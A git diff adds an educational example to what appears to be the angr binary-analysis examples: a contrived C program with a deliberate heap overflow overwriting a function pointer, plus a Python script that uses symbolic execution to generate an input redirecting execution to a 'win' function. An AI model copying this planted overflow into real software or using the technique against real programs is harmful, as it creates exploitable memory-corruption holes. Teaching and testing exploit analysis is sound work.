diff --git a/examples/simple_heap_overflow/simple_heap_overflow b/examples/simple_heap_overflow/simple_heap_overflow
new file mode 100755
index 0000000..ba85d5b
Binary files /dev/null and b/examples/simple_heap_overflow/simple_heap_overflow differ
diff --git a/examples/simple_heap_overflow/simple_heap_overflow.c b/examples/simple_heap_overflow/simple_heap_overflow.c
new file mode 100644
index 0000000..4ee9a8e
--- /dev/null
+++ b/examples/simple_heap_overflow/simple_heap_overflow.c
@@ -0,0 +1,38 @@
+#include <stdio.h>
+#include <stdlib.h>
+
+typedef void (*printFunction)();
+
+// Contrived structure
+typedef struct myStruct {
+    printFunction print;
+    char buf[16];
+} myStruct;
+
+// We want to get here
+void win() {
+    printf("Win function executed.");
+}
+
+int main() {
+    // Unbuffering to make things clearer
+    setbuf(stdin,0);
+    setbuf(stdout,0);
+
+    // Setup our two structs
+    myStruct *a = calloc(1,sizeof(myStruct));
+    myStruct *b = calloc(1,sizeof(myStruct));
+
+    // Read in input
+    printf("Input b: ");
+    fgets(b->buf,64,stdin);
+    b->print = printf;
+
+    printf("Input a: ");
+    fgets(a->buf,64,stdin);
+    a->print = printf;
+
+    // Print the results
+    b->print("Output b: %s",b->buf);
+    a->print("Output a: %s",a->buf);
+}
diff --git a/examples/simple_heap_overflow/solve.py b/examples/simple_heap_overflow/solve.py
new file mode 100755
index 0000000..46d98b1
--- /dev/null
+++ b/examples/simple_heap_overflow/solve.py
@@ -0,0 +1,71 @@
+#!/usr/bin/env python
+
+import os, os.path
+import subprocess
+
+DIR = os.path.dirname(os.path.realpath(__file__))
+
+def main():
+    # angr now has the ability to correctly execute through malloc. this is a big
+    # achievement as malloc is a complicated function and shows off how much effort
+    # has been placed into creating correct execution. In this example, we will use
+    # angr to perform a basic heap overwrite and achieve control over rip.
+
+    # The premise of this binary is to ask for two inputs, the second of which can
+    # overflow into the area of the first. Further, a pointer will be dereferenced
+    # in this process, thus giving us a target to control execution from.
+
+    import angr, simuvex
+
+    # By default, angr will use a sim procedure instead of going through malloc
+    # This will tell angr to go ahead and use libc's calloc
+    proj = angr.Project("./simple_heap_overflow", exclude_sim_procedures_list=["calloc"])
+
+    # The extra option here is due to a feature not yet in angr for handling
+    # underconstraining 0 initialization of certain memory allocations
+    state = proj.factory.entry_state(add_options={simuvex.o.CGC_ZERO_FILL_UNCONSTRAINED_MEMORY})
+
+    # We're looking for unconstrained paths, it means we may have control
+    pg = proj.factory.path_group(state,save_unconstrained=True)
+
+    # Step execution until we find a place we may control
+    while pg.active != [] and pg.unconstrained == []:
+        pg.step()
+
+    # In [9]: pg
+    # Out[9]: <PathGroup with 1 deadended, 1 unconstrained>
+
+    # Make a copy of the state to play with
+    s = pg.unconstrained[0].state.copy()
+
+    # Now we can simply tell angr to set the instruction pointer to point at the
+    # win function to give us execution
+    s.add_constraints(s.regs.rip == proj.loader.main_bin.get_symbol('win').addr)
+
+    assert s.satisfiable()
+
+    # Call the solving engine and write the solution out to a file called "exploit"
+    print "Writing exploit as \"exploit\""
+    s.posix.dump(0,"exploit")
+
+    # Now you can run the program and feed it your exploit to gain execution
+    # ./simple_heap_overflow < exploit
+
+def test():
+
+    # Generate the exploit
+    main()
+
+    # Make sure it worked
+    out = subprocess.check_output("{0} < {1}".format(
+        os.path.join(DIR,"simple_heap_overflow"),
+        os.path.join(DIR,"exploit"),
+        )
+        ,shell=True)
+
+    # Assert we got to the printing of Win
+    assert "Win" in out
+
+
+if __name__ == '__main__':
+    main()
diff --git a/test.py b/test.py
index f7168aa..da464b1 100644
--- a/test.py
+++ b/test.py
@@ -107,6 +107,7 @@ def test_whitehatvn2015_re400(): exampletest_single('whitehatvn2015_re400')
 #def test_defcon2016quals_baby_re_0(): exampletest_single('defcon2016quals_baby-re_0')
 def test_defcon2016quals_baby_re_1(): exampletest_single('defcon2016quals_baby-re_1')
 def test_sharif7_rev50(): exampletest_single(os.path.join('sharif7', 'rev50'))
+def test_simple_heap_overflow(): exampletest_single('simple_heap_overflow')
 
 if __name__ == '__main__':
     for tester, arg in test_docs():
@@ -134,3 +135,4 @@ def test_sharif7_rev50(): exampletest_single(os.path.join('sharif7', 'rev50'))
     exampletest_single('whitehat_crypto400')
     exampletest_single('whitehatvn2015_re400')
     exampletest_single('defcon2016quals_baby-re_1')
+    exampletest_single('simple_heap_overflow')
